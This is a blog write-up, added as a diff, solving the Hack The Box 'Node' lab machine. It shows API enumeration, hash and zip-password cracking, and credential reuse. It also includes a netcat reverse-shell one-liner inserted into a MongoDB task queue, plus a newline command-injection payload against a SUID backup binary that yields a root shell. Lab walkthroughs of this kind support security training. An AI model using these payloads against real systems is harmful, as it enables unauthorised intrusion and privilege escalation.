@@ -1,0 +1,523 @@
+---
+title: Hack The Box - Node (Without Metasploit)
+date: 2021-01-15 22:16:00 +0800
+categories: [hackthebox]
+tags: [linux, express, mongodb, command injection]
+---
+
+![](/assets/images/node.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating system that I will be using to tackle this machine is a Kali Linux VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+```bash
+$ echo "10.10.10.58 node.htb" | sudo tee -a /etc/hosts
+```
+
+# Reconnaissance
+
+```bash 
+$ rustscan --accessible -a node.htb -r 1-65535 -- -sT -sV -sC -Pn
+File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
+Open 10.10.10.58:22
+Open 10.10.10.58:3000
+Starting Script(s)
+Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-15 00:25 UTC
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 0.00s elapsed
+Initiating Connect Scan at 00:25
+Scanning node.htb (10.10.10.58) [2 ports]
+Discovered open port 22/tcp on 10.10.10.58
+Discovered open port 3000/tcp on 10.10.10.58
+Completed Connect Scan at 00:25, 0.00s elapsed (2 total ports)
+Initiating Service scan at 00:25
+Scanning 2 services on node.htb (10.10.10.58)
+Completed Service scan at 00:25, 11.04s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.10.58.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 1.22s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 0.00s elapsed
+Nmap scan report for node.htb (10.10.10.58)
+Host is up, received user-set (0.0047s latency).
+Scanned at 2021-01-15 00:25:24 UTC for 13s
+
+PORT     STATE SERVICE         REASON  VERSION
+22/tcp   open  ssh             syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
+|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
+|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
+3000/tcp open  hadoop-datanode syn-ack Apache Hadoop
+| hadoop-datanode-info: 
+|_  Logs: /login
+| hadoop-tasktracker-info: 
+|_  Logs: /login
+|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: MyPlace
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.97 seconds
+```
+
+# Enumeration (1)
+
+## Port 3000 `ExpressJS`
+
+![](/assets/images/node1.png)
+
+This looks like a company website. The only thing we have is a `Login` button, but unfortunately we cannot do much with it.
+
+![](/assets/images/node1.png)
+
+If you enter into `Firefox`'s web console, navigate to `Network` and refresh the page, you will see that there are many different `javascript` files being loaded.
+
+![](/assets/images/node2.png)
+
+`home.js`:
+```javascript
+var controllers = angular.module('controllers');
+
+controllers.controller('HomeCtrl', function ($scope, $http) {
+  $http.get('/api/users/latest').then(function (res) {
+    $scope.users = res.data;
+  });
+});
+```
+
+It seems that there is an endpoint at `/api/users/latest`. If we visit it, we see a bunch of usernames and password hashes!
+
+![](/assets/images/node3.png)
+
+However if we take these hashes and crack them with `Crackstation`, we would only retrieve 2/3 of the passwords.
+
+![](/assets/images/node4.png)
+
+If we use any of these credentials to login, we would get a message saying the control panel is only available to admin users, and according to the data we got from `/api/users/latest`, `is_admin` is set to `false`! I didn't see any way to overwrite this `is_admin` to `true`, so we have to look for other ways.
+
+`profile.js`:
+```javascript
+var controllers = angular.module('controllers');
+
+controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
+  $http.get('/api/users/' + $routeParams.username)
+    .then(function (res) {
+      $scope.user = res.data;
+    }, function (res) {
+      $scope.hasError = true;
+
+      if (res.status == 404) {
+        $scope.errorMessage = 'This user does not exist';
+      }
+      else {
+        $scope.errorMessage = 'An unexpected error occurred';
+      }
+    });
+});
+```
+
+There was also a similar route `/api/users/`, takes in a `username` at the back. Lets try with `tom`.
+
+
+`/api/users/tom`:  
+![](/assets/images/node5.png)
+
+It only shows the user information on one user instead of multiple users. But what happens when we do not put a `username`?
+
+
+`/api/users`:                                                                                               
+![](/assets/images/node6.png)
+
+We now see an addtional user `myP14ceAdm1nAcc0uNT` and his `is_admin` is set to `true`, so he must be able to access the control panel. Lets use `Crackstation` again to use his hash.
+
+![](/assets/images/node7.png)
+
+Now if we login with `myP14ceAdm1nAcc0uNT:manchester`, we will see a `Download Backup` button.
+
+![](/assets/images/node7.png)
+
+Clicking it will download a file called `myplace.backup`. If we open it, we will get a bunch of random alphanumeric characters. However at the end we will see some `=`.
+
+```bash
+$ cat myplace.backup
+...
+AAAAAAQAAALSBLPQlAHZhci93d3cvbXlwbGFjZS9zdGF0aWMvcGFydGlhbHMvcHJvZmlsZS5odG1sVVQFAAMimapZdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAJAAgAfWMiS4Tw22u4BAAAFQ8AABgAGAAAAAAAAQAAALSBtvUlAHZhci93d3cvbXlwbGFjZS9hcHAuaHRtbFVUBQADvpWqWXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAXwNfA3edAQDQ+iUAAAA=
+```
+
+Using the `base64`, we can decode it and save the results to another file.
+
+```bash
+$ cat myplace.backup | base64 -d > results
+```
+
+The resulting file is a `zip` file!
+
+```
+$ file results             
+results: Zip archive data, at least v1.0 to extract
+```
+
+Lets try to unzip it.
+
+```bash
+$ mv results results.zip                                                                     
+$ unzip results.zip 
+Archive:  results.zip
+   creating: var/www/myplace/
+[results.zip] var/www/myplace/package-lock.json password:
+```
+
+We are immediately prompted for a password. We can use `zip2john` to retrieve a hash which we can crack to get the password!
+
+```bash
+$ zip2john results.zip > hash.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+magicword        (output.zip)
+1g 0:00:00:00 DONE (2021-01-14 20:16) 50.00g/s 9420Kp/s 9420Kc/s 9420KC/s sandrea..becky21
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+After unzipping it by using the `magicword` as the password, we obtain what seems to be the source of the web application!
+
+```bash
+$ ls -al ./var/www/myplace
+total 56
+drwxr-xr-x  4 kali kali  4096 Sep  3  2017 .
+drwxr-xr-x  3 kali kali  4096 Jan 15 07:37 ..
+-rw-rw-r--  1 kali kali  3861 Sep  2  2017 app.html
+-rw-rw-r--  1 kali kali  8058 Sep  3  2017 app.js
+drwxr-xr-x 69 kali kali  4096 Sep  1  2017 node_modules
+-rw-rw-r--  1 kali kali   283 Sep  1  2017 package.json
+-rw-r--r--  1 kali kali 21264 Sep  1  2017 package-lock.json
+drwxrwxr-x  6 kali kali  4096 Sep  1  2017 static
+```
+
+If we view `app.js`, we find some `MongoDB` credentials!
+
+```bash
+$ cat ./var/www/myplace/app.js            
+...
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+...
+```
+
+I then used the credentials on the `ssh` service and it logs us in!
+
+```bash
+$ ssh mark@node.htb             
+The authenticity of host 'node.htb (10.10.10.58)' can't be established.
+ECDSA key fingerprint is SHA256:I0Y7EMtrkyc9Z/92jdhXQen2Y8Lar/oqcDNLHn28Hbs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'node.htb,10.10.10.58' (ECDSA) to the list of known hosts.
+mark@node.htb's password: 5AYRft73VtFpc84k
+mark@node:~$ id
+uid=1001(mark) gid=1001(mark) groups=1001(mark)
+```
+
+Unfortunately, there was no user flag in `mark`'s home directory.
+
+Moving on, when checking the running processes, I saw another `node` process running.
+
+```bash
+$ ps aux
+tom       1219  0.0  5.7 1008568 43444 ?       Ssl  10:14   0:02 /usr/bin/node /var/scheduler/app.js
+...
+tom       1224  0.0  7.8 1031336 59376 ?       Ssl  10:14   0:03 /usr/bin/node /var/www/myplace/app.js
+```
+
+The other `node` process was running `/var/scheduler/app.js` so lets check it out.
+
+```javascript
+mark@node:~$ cat /var/scheduler/app.js
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
+
+  setInterval(function () {
+    db.collection('tasks').find().toArray(function (error, docs) {
+      if (!error && docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log('Executing task ' + doc._id + '...');
+            exec(doc.cmd);
+            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log('Something went wrong: ' + error);
+      }
+    });
+  }, 30000);
+
+});
+```
+
+Judging from the code, at every 30s, it will query for all the documents in the `tasks` collection and execute the contents of the `cmd` property of each document found as a `bash` command and then proceed to delete the documents. 
+
+# Exploitation (1)
+
+Now, we just need to access the `MongoDB` directly and insert a document containing a command which will establish a reverse shell.
+
+```bash
+$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
+MongoDB shell version: 3.2.16
+connecting to: localhost:27017/scheduler
+> db.tasks.insertOne({"cmd":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.XX.XX 1337 >/tmp/f"})
+{
+        "acknowledged" : true,
+        "insertedId" : ObjectId("6001919a9b6e0212d49e4b24")
+}
+```
+
+And then we setup our `nc` listener.
+
+```bash
+$ nc lvnp 1337
+listening on [any] 1337 ...
+```
+
+After a while , we will get a shell as `tom`!
+
+```bash
+$ rlwrap nc -lvnp 1337                                                                                                      
+listening on [any] 1337 ...
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.58] 43648
+/bin/sh: 0: can't access tty; job control turned off
+python -c "import pty; pty.spawn('/bin/bash')"
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@node:/$ id
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
+```
+
+# user.txt
+
+The user flag is in `tom`'s home directory.
+
+```bash
+tom@node:/$ cat /home/tom/user.txt
+e115XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+# Enumeration (2)
+
+When we check for files that have the `SUID` bit set,
+
+```bash
+tom@node:/$ find `find / -perm -4000 -type f 2>/dev/null` -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+...
+-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
+```
+
+We see that there a program called `/usr/local/bin/backup` whose group owner is `admin`, which `tom` is in! That means if we execute this program, we will be running as the owner, or in this case is `root`.
+
+Weirdly enough, running it doesn't return any outputs.
+
+Going back to the `app.js` we found in `/var/www/myplace`, we see that this program is being used.
+
+```javascript
+...
+app.get('/api/admin/backup', function (req, res) {
+    if (req.session.user && req.session.user.is_admin) {
+      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
+      var backup = '';
+
+      proc.on("exit", function(exitCode) {
+        res.header("Content-Type", "text/plain");
+        res.header("Content-Disposition", "attachment; filename=myplace.backup");
+        res.send(backup);
+      });
+...
+```
+
+It seem to take in 3 parts, the `-q` option, a `backup_key` and a directory name. We already got 1 `backup_key` we can use, which is from `/var/www/myplace/app.js`.  Lets create a directory, put a fake file and test it out.
+
+```bash
+tom@node:/$ mkdir /tmp/test
+tom@node:/$ echo "hello world" > /tmp/test/test.txt
+tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test
+UEsDBAoAAAAAAO1rL1IAAAAAAAAAAAAAAAAJABwAdG1wL3Rlc3QvVVQJAAMumQFgNZkBYHV4CwABBOgDAAAE6AMAAFBLAwQKAAkAAADtay9SLTsIrxgAAAAMAAAAEQAcAHRtcC90ZXN0L3Rlc3QudHh0VVQJAAMumQFgLpkBYHV4CwABBOgDAAAE6AMAAMZi5h0ojRxdCstFtxM/FIxJLl09pqn/Z1BLBwgtOwivGAAAAAwAAABQSwECHgMKAAAAAADtay9SAAAAAAAAAAAAAAAACQAYAAAAAAAAABAA7UEAAAAAdG1wL3Rlc3QvVVQFAAMumQFgdXgLAAEE6AMAAAToAwAAUEsBAh4DCgAJAAAA7WsvUi07CK8YAAAADAAAABEAGAAAAAAAAQAAAKSBQwAAAHRtcC90ZXN0L3Rlc3QudHh0VVQFAAMumQFgdXgLAAEE6AMAAAToAwAAUEsFBgAAAAACAAIApgAAALYAAAAAAA==
+```
+
+The output was a `base64` string. If we follow what we did for the `myplace.backup`, we will get back the original file!
+
+```bash
+$ echo "UEsDBAoAAAAAAO1rL1IAAAAAAAAAAAAAAAAJABwAdG1wL3Rlc3QvVVQJAAMumQFgNZkBYHV4CwABBOgDAAAE6AMAAFBLAwQKAAkAAADtay9SLTsIrxgAAAAMAAAAEQAcAHRtcC90ZXN0L3Rlc3QudHh0VVQJAAMumQFgLpkBYHV4CwABBOgDAAAE6AMAAMZi5h0ojRxdCstFtxM/FIxJLl09pqn/Z1BLBwgtOwivGAAAAAwAAABQSwECHgMKAAAAAADtay9SAAAAAAAAAAAAAAAACQAYAAAAAAAAABAA7UEAAAAAdG1wL3Rlc3QvVVQFAAMumQFgdXgLAAEE6AMAAAToAwAAUEsBAh4DCgAJAAAA7WsvUi07CK8YAAAADAAAABEAGAAAAAAAAQAAAKSBQwAAAHRtcC90ZXN0L3Rlc3QudHh0VVQFAAMumQFgdXgLAAEE6AMAAAToAwAAUEsFBgAAAAACAAIApgAAALYAAAAAAA==" | base64 -d > output.zip
+$ unzip output.zip
+Archive:  output.zip
+   creating: tmp/test/
+[output.zip] tmp/test/test.txt password: 
+ extracting: tmp/test/test.txt 
+$ tmp/test/test.txt
+hello world
+```
+
+This is interesting, lets try backing up the `/root` directory, which will contain the `root` flag.
+
+```bash
+tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
+[+] Finished! Encoded backup is below:
+                                                                                                                                                             
+UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
+```
+
+However, decoding it and unzipping will give the ASCII art of a troll face. Trying with `/etc` which contains the `/etc/shadow` file also didn't work. If we run `strings`, we start seeing something.
+
+```bash
+tom@node:/$ strings /usr/local/bin/backup
+...
+Could not open file                                                                                                                                          
+Validated access token                                                                                                                                       
+Ah-ah-ah! You didn't say the magic word!                                                                                                                     
+Finished! Encoded backup is below:                                                                                                                           
+UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==                                              
+/root                                                                                                                                                        
+/etc                                                                                                                                                         
+/tmp/.backup_%i                                                                                                                                              
+/usr/bin/zip -r -P magicword %s %s > /dev/null                                                                                                               
+/usr/bin/base64 -w0 %s                                                                                                                                       
+The target path doesn't exist 
+...
+```
+
+It seems that `/root` and `/etc` are listed here. Perhaps this is a blacklist? Also the `base64` string above will return a ASCII art of a troll face as well. Lets see what functions calls are being made during execution.
+
+```bash
+tom@node:/$ ltrace -s 200 /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test
+...
+strcat("/e", "tc")                               = "/etc"                                                                                                    
+strcat("/etc", "/m")                             = "/etc/m"                                                                                                  
+strcat("/etc/m", "yp")                           = "/etc/myp"                                                                                                
+strcat("/etc/myp", "la")                         = "/etc/mypla"                                                                                              
+strcat("/etc/mypla", "ce")                       = "/etc/myplace"                                                                                            
+strcat("/etc/myplace", "/k")                     = "/etc/myplace/k"                                                                                          
+strcat("/etc/myplace/k", "ey")                   = "/etc/myplace/key"                                                                                        
+strcat("/etc/myplace/key", "s")                  = "/etc/myplace/keys"                                                                                       
+fopen("/etc/myplace/keys", "r")                  = 0x9392008                                                                                                 
+fgets("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", 1000, 0x9392008) = 0xffdc6f8f                                                    
+strcspn("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", "\n") = 64                                                                     
+strcmp("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", "a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508") = -1          
+fgets("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", 1000, 0x9392008) = 0xffdc6f8f                                                    
+strcspn("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", "\n") = 64                                                                     
+strcmp("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474") = 0           
+fgets("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", 1000, 0x9392008) = 0xffdc6f8f                                                    
+strcspn("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", "\n") = 64                                                                     
+strcmp("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110") = 1
+```
+
+We first see a bunch of `strcmp`s which seems to be checks for the `backup_key`. There is also the opening of the file `/etc/myplace/keys` which contained all the `backup_keys`.
+
+```bash
+tom@node:/$ cat /etc/myplace/keys
+a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508                                                                                             
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474                                                                                             
+3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
+```
+
+We also a bit of checks for blacklisted characters and strings.
+
+```bash
+...
+strstr("/tmp/test", "..")                        = nil                                                                                                       
+strstr("/tmp/test", "/root")                     = nil                                                                                                       
+strchr("/tmp/test", ';')                         = nil                                                                                                       
+strchr("/tmp/test", '&')                         = nil                                                                                                       
+strchr("/tmp/test", '`')                         = nil                                                                                                       
+strchr("/tmp/test", '$')                         = nil                                                                                                       
+strchr("/tmp/test", '|')                         = nil                                                                                                       
+strstr("/tmp/test", "//")                        = nil                                                                                                       
+strcmp("/tmp/test", "/")                         = 1                                                                                                         
+strstr("/tmp/test", "/etc")                      = nil 
+... 
+```
+
+And lastly, we see the `zip` command being executed.
+
+```bash
+...
+system("/usr/bin/zip -r -P magicword /tmp/.backup_202542863 /tmp/test > /dev/null")
+...
+```
+
+We could perhaps inject some commands here since the directory name we supplied is part of the command being executed. However, we will need to watchout for the blacklisted characters and strings. After much trials, I managed to find a way being using newlines!
+
+# Exploitation (2)
+
+By setting my directory name as `"$(printf '\n/bin/sh -p\nid')"`, we will get a shell as `root`!
+
+```bash
+# id
+uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
+```
+
+The reason for this is because the final command performed by `backup` will result to:
+
+```bash
+system("/usr/bin/zip -r -P magicword /tmp/.backup_202542863 
+        /bin/sh
+        id > /dev/null")
+```
+
+It will be as if we are running 3 commands at the same time! The reason for the last `id` behind is so that `/bin/sh` will not run with `> /dev/null` behind it, which will cause all the outputs of `/bin/sh` to go to `/dev/null`.
+
+# root.txt
+
+The root flag is located in `root`'s home directory, as usual.
+
+```bash
+# cat /root/root.txt
+1722XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
